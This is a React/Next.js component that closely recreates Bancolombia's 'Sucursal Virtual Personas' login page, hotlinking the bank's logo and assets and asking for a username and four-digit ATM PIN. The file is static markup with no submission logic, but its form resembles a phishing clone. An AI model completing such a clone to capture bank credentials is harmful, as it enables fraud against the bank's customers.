
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
export default function SvpAuthPage() {
  return (
    <div className="svp-authentication">

      <div className="register-template" title="Sucursal Virtual Personas">
        <div className="simple-template">

          <main className="svp-main">
            <div
              className="bc-container-fluid trazo"
              style={{
                backgroundImage:
                  "url('https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg')",
              }}
            >
              {/* Logo principal */}
              <div className="bc-flex bc-justify-content-center">
                <div className="bc-flex bc-justify-content-center bc-mt-5">
                  <div
                    className="bc-logo logo bc-flex bc-justify-content-center"
                    style={{ width: "11.5rem" }}
                  >
                    <img
                      src="https://library-sdb.apps.bancolombia.com/bds/7.41.13/assets/icons/logos/bancolombia-horizontal-no-spacing.svg"
                      alt="logo"
                      style={{ width: "11.5rem" }}
                    />
                  </div>
                </div>
              </div>

              <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                Sucursal Virtual Personas
              </h1>

              <div className="bc-row bc-justify-content-center form-container">
                <div className="bc-col-xs-6 bc-col-md-8 bc-col-lg-4">
                  {/* Sección vacía */}
                  <section className="bc-mt-4" style={{ background: "#f9f9fa" }}></section>

                  <div>
                    <div className="bc-card-body bc-mt-4">
                      {/* TARJETA DE AUTENTICACIÓN */}

                      <div className="bc-card bc-card-auth bc-card-container">
                        <div className="bc-card-auth-body">

                          <section className="bc-card-auth-head">
                            <section>
                              <em aria-hidden="true" className="bc-icon"></em>
                            </section>

                            <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">
                              ¡Hola!
                            </h1>

                            <h3 className="bc-card-auth-description bc-mt-3">
                              Ingresa los datos para gestionar tus productos y hacer
                              transacciones.
                            </h3>
                          </section>

                          <form noValidate id="form">
                            <section>
                              <section className="bc-card-auth-container">

                                {/* Usuario */}
                                <div className="authentication-form__username">
                                  <div className="bc-form-field" id="s.4261862116">
                                    <em aria-hidden="true">user</em>

                                    <input
                                      id="username"
                                      className="bc-input bc-input-error"
                                      placeholder=" "
                                      autoComplete="off"
                                      autoCorrect="off"
                                      spellCheck="false"
                                      maxLength={20}
                                      aria-label="Ingresar usuario"
                                      aria-describedby="username-helper"
                                    />

                                    <label htmlFor="username">Usuario</label>

                                    <span
                                      id="username-helper"
                                      role="alert"
                                      className="authentication-form__help-text"
                                    >
                                      Ingresa tu usuario
                                    </span>

                                    <a
                                      data-bc-link
                                      href="#"
                                      className="bc-opensans-font-style-1-bold bc-link link-default link-underline"
                                    >
                                      <u>¿Olvidaste tu usuario?</u>
                                    </a>
                                  </div>
                                </div>

                                {/* Clave */}
                                <div className="authentication-form__password">
                                  <div className="bc-form-field" id="s.1022734530">
                                    <em aria-hidden="true">lock</em>

                                    <input
                                      id="password"
                                      type="text"
                                      className="authentication-form__password-input bc-input"
                                      autoComplete="off"
                                      maxLength={4}
                                      inputMode="numeric"
                                      placeholder=" "
                                      aria-label="Ingresa clave del cajero"
                                      aria-describedby="password-helper"
                                    />

                                    <label htmlFor="password" aria-hidden="true">
                                      Clave del cajero
                                    </label>

                                    <span
                                      id="password-helper"
                                      role="alert"
                                      className="authentication-form__help-text bc-d-none"
                                    ></span>

                                    <a
                                      data-bc-link
                                      href="#"
                                      className="bc-opensans-font-style-1-bold bc-link link-default link-underline"
                                    >
                                      <u>¿Olvidaste o bloqueaste tu clave?</u>
                                    </a>
                                  </div>
                                </div>

                              </section>
                            </section>

                            {/* Botón */}
                            <section className="bc-card-auth-button">
                              <button
                                disabled
                                className="bc-button bc-button-fill bc-button-primary"
                                type="button"
                              >
                                Iniciar sesión
                              </button>
                            </section>
                          </form>

                          {/* Crear usuario */}
                          <section className="bc-card-auth-link">
                            <a
                              data-bc-link
                              href="/crear-usuario/ingresa-tus-datos"
                              className="bc-link link-default link-underline"
                            >
                              <u>Crear usuario</u>
                            </a>
                          </section>

                        </div>
                      </div>
                    </div>

                    {/* Loader */}
                    <div className="bc-circle-loading-container">
                      <article
                        className="bc-circle-loading"
                        data-text="Cargando..."
                        role="status"
                      >
                        <section
                          className="bc-circle-loading-circle"
                          style={{ "--circle-loading-size": "160px" } as any}
                        >
                          <em
                            className="bc-icon bc-xl bc-loader bc-circle-loading-loader-icon"
                            aria-hidden="true"
                          >
                            spinner
                          </em>
                          <p className="bc-circle-loading-info">Cargando...</p>
                        </section>
                      </article>
                    </div>

                  </div>
                </div>
              </div>

            </div>
          </main>

        </div>
      </div>
    </div>
  );
}